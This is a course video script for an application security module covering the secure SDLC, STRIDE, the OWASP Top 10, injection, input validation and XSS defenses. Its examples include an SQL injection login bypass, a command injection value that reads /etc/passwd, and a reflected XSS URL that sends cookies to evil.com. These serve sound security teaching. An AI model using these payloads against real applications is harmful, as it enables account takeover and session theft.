# Video Script: Module 10 — Application Security (Part 1 of 2)

## Course: CIS-4328 Information Security

## Texas Wesleyan University | Professor Nash

## Estimated Duration: 15 minutes

## Certification Alignment: CompTIA Security+ (SY0-701)

---

## Segment 1 — Introduction and the Secure SDLC (3 minutes)

Welcome to Module 10, Application Security. This is one of my favorite topics because it sits at the intersection of development and security — two disciplines that historically have not cooperated well, and the consequences of that gap are measured in billions of dollars of breach costs every year.

The web application is the most common attack surface in modern enterprise environments. According to Verizon's Data Breach Investigations Report, web application attacks consistently rank among the top three breach patterns year over year. Understanding how applications are attacked and how developers can prevent those attacks is essential knowledge for any security professional.

For Security+, application security content appears primarily in Domain 2 (Architecture and Design) and Domain 1 (Threats, Attacks and Vulnerabilities). Let us start from the beginning: how do secure applications get built?

### The Secure Software Development Lifecycle (SDLC)

Traditional software development follows a lifecycle: requirements, design, implementation, testing, deployment, and maintenance. The secure SDLC — often called S-SDLC or SecSDLC — integrates security activities into every phase rather than treating security as a final gate before deployment.

**Requirements phase security activities:**

- Define security requirements alongside functional requirements
- Identify data classification (what data will the application handle?)
- Identify regulatory requirements (HIPAA, PCI DSS, GDPR applicability)
- Perform threat modeling — who are the adversaries, what do they want, what can they do?

**Design phase security activities:**

- Apply security design principles: least privilege, defense in depth, fail secure, separation of duties
- Design authentication and authorization architecture before writing any code
- Create data flow diagrams and identify trust boundaries
- Review cryptographic algorithm choices

**Implementation phase security activities:**

- Apply secure coding standards (OWASP guidelines, language-specific secure coding guides)
- Conduct code reviews — peer review for security as well as functionality
- Use static analysis tools (SAST) to scan code as it is written

**Testing phase security activities:**

- Run dynamic analysis tools (DAST) against the running application
- Perform penetration testing
- Conduct fuzz testing (sending malformed input to find crashes and vulnerabilities)

**Deployment phase security activities:**

- Harden the deployment environment (disable unnecessary services, apply patches)
- Use secrets management — no hardcoded credentials in deployment configurations
- Enable security logging and monitoring

**Maintenance phase security activities:**

- Respond to vulnerability reports
- Track and apply security patches to third-party dependencies
- Conduct periodic security reassessments

The key insight of the S-SDLC is that fixing a security vulnerability discovered in production costs, on average, 30 times more than fixing it during design, and 6 times more than fixing it during implementation. Shifting security left — earlier in the lifecycle — is both more effective and more economical.

---

## Segment 2 — Threat Modeling (3 minutes)

Threat modeling is the structured process of identifying security threats before they materialize. It happens during the design phase and answers four questions:

1. What are we building?
2. What can go wrong?
3. What are we going to do about it?
4. Did we do a good job?

### The STRIDE Model

The most widely used threat modeling framework in enterprise environments is STRIDE, developed by Microsoft. Each letter represents a threat category:

**S — Spoofing** — An attacker impersonates a legitimate user or system. Example: a malicious actor authenticates with stolen credentials. Mitigation: strong authentication (MFA).

**T — Tampering** — An attacker modifies data in transit or at rest. Example: a man-in-the-middle attack changes a bank transfer amount. Mitigation: integrity controls (digital signatures, HMAC), TLS.

**R — Repudiation** — A user performs an action and later denies it. Example: an insider transfers funds and denies authorizing it. Mitigation: non-repudiation controls (audit logging, digital signatures).

**I — Information Disclosure** — Sensitive data is exposed to unauthorized parties. Example: a verbose error message reveals database schema details. Mitigation: error handling, data minimization, encryption.

**D — Denial of Service** — Availability of the system is disrupted. Example: an attacker floods a login endpoint with requests. Mitigation: rate limiting, DDoS protection, resource quotas.

**E — Elevation of Privilege** — An attacker gains higher-level access than authorized. Example: a regular user exploits a flaw to gain admin rights. Mitigation: least privilege, input validation, authorization checks.

For each component in your system (APIs, databases, user interfaces, third-party integrations), you apply STRIDE and document: what is the threat, what is the current control, is the residual risk acceptable?

### Data Flow Diagrams in Threat Modeling

Before you can apply STRIDE, you need to understand how data flows through your system. Draw a data flow diagram (DFD) that shows:

- External entities (users, other systems)
- Processes (the application logic)
- Data stores (databases, file systems, caches)
- Data flows (arrows showing how data moves)
- Trust boundaries (lines showing where privilege levels change)

Every time data crosses a trust boundary — from internet to DMZ, from user to application, from application to database — that crossing is a potential threat vector. STRIDE your trust boundary crossings.

---

## Segment 3 — OWASP Top 10 Overview and Injection Attacks (5 minutes)

The OWASP Top 10 is the definitive list of the most critical web application security risks. Published by the Open Web Application Security Project (OWASP), it is updated periodically and is the industry standard for understanding web application vulnerabilities. Security+ tests your knowledge of these vulnerabilities, and you will encounter them in any application security role.

The current OWASP Top 10 (2021 edition) is:

1. Broken Access Control
2. Cryptographic Failures (formerly "Sensitive Data Exposure")
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging and Monitoring Failures
10. Server-Side Request Forgery (SSRF)

We will cover the most exam-relevant entries in depth.

### A03: Injection — The Classic Vulnerability

Injection attacks occur when untrusted data is sent to an interpreter as part of a command or query. The interpreter executes the attacker-controlled data as code. The most common form is SQL injection, but injection vulnerabilities exist in OS commands, LDAP queries, XML parsers, NoSQL databases, and more.

**SQL Injection — How It Works**

Consider a login form. The application constructs this SQL query:

```sql
SELECT * FROM users WHERE username = '[input]' AND password = '[input]'
```

A normal user enters `alice` and `password123`. The query becomes:

```sql
SELECT * FROM users WHERE username = 'alice' AND password = 'password123'
```

An attacker enters `admin' --` as the username and anything as the password. The query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

The double dash is a SQL comment — everything after it is ignored. The attacker authenticates as admin without knowing the password.

**Blind SQL Injection** occurs when the application does not return database error messages to the attacker. The attacker infers database structure through timing differences or true/false responses. This is slower but equally dangerous.

**Preventing SQL Injection**

The definitive defense is **parameterized queries** (also called prepared statements). Instead of concatenating user input into a query string, you separate the query structure from the data:

```python
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

The database driver handles the separation. The user input can never be interpreted as SQL code regardless of what characters it contains.

Secondary defenses include:

- Input validation (reject inputs that do not match expected patterns)
- Stored procedures (with proper parameterization inside the procedure)
- Least privilege on database accounts (application accounts should not have DROP TABLE permissions)
- Web application firewall (WAF) as an additional layer — not a substitute for parameterization

**OS Command Injection** works on the same principle. If an application executes system commands using user-supplied input without sanitization, the attacker can inject additional commands. Example: a web server pings a user-supplied hostname. The attacker supplies `8.8.8.8; cat /etc/passwd`. The semicolon terminates the ping command and the attacker executes a second command.

---

## Segment 4 — Input Validation and Output Encoding (4 minutes)

Input validation and output encoding are the two most fundamental application security controls. They are different, complementary, and both are required.

### Input Validation

Input validation means verifying that all data entering your application conforms to what your application expects before processing it. The key principles are:

**Validate on the server side, always.** Client-side validation (JavaScript in a browser) is a usability feature, not a security control. An attacker can bypass it trivially by using curl, Burp Suite, or modifying the HTTP request directly. Server-side validation is the only validation that counts.

**Allowlist over blocklist.** Define what is acceptable and reject everything else. A field that should contain a US phone number should accept only digits, parentheses, hyphens, and spaces in the correct format — not "everything except certain bad characters." Blocklists are incomplete by nature.

**Validate type, length, range, and format.**

- Type: is this a number when a number is expected?
- Length: is this within the expected character count? Overly long inputs can cause buffer overflows.
- Range: is this number within the acceptable value range?
- Format: does this match the expected pattern (email, date, zip code)?

**Canonicalize before validating.** Encoding tricks (URL encoding, Unicode normalization, double encoding) can bypass naive validation. Normalize the input to its canonical form before applying validation rules.

### Output Encoding

Output encoding addresses a different problem: preventing data from being interpreted as code when it is rendered or executed in a different context.

**Cross-Site Scripting (XSS)** is the canonical output encoding failure. XSS occurs when user-supplied data is included in an HTML response without encoding, causing the browser to execute it as JavaScript.

Reflected XSS example: a search feature displays "You searched for: [your input]". If the input is not encoded, an attacker can craft a URL like:

```
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

A victim who clicks this link has their session cookie sent to the attacker.

**Preventing XSS with Output Encoding**

When inserting user-supplied data into HTML, encode it for the context:

- HTML context: encode `<` as `&lt;`, `>` as `&gt;`, `"` as `&quot;`, `'` as `&#x27;`, `&` as `&amp;`
- JavaScript context: use JSON encoding — never insert user data directly into a `<script>` block
- URL context: percent-encode all non-alphanumeric characters
- CSS context: avoid inserting user data into CSS; if unavoidable, encode strictly

Modern frameworks (React, Angular, Vue) encode HTML output by default and provide mechanisms for deliberately rendering raw HTML (`dangerouslySetInnerHTML` in React). Use those raw HTML mechanisms only when absolutely necessary and sanitize the content with a library like DOMPurify first.

**Content Security Policy (CSP)** is a browser security header that restricts where scripts can load from and whether inline scripts are allowed. Even if an XSS vulnerability exists, a well-configured CSP can prevent the injected script from executing or exfiltrating data.

---

## Module 10 Part 1 Summary

We covered the foundation of application security:

- The Secure SDLC integrates security into every phase and dramatically reduces the cost of remediation
- Threat modeling with STRIDE identifies threats systematically before code is written
- SQL injection and OS command injection occur when untrusted data is interpreted as code — parameterized queries are the cure
- Input validation (server-side, allowlist-based, type/length/range/format) prevents malformed data from reaching application logic
- Output encoding prevents data from being interpreted as code in downstream contexts — the key defense against XSS

In Part 2, we cover more OWASP Top 10 entries, secure coding practices, code review, and SAST/DAST integration. See you there.

---

*End of Part 1 Script*
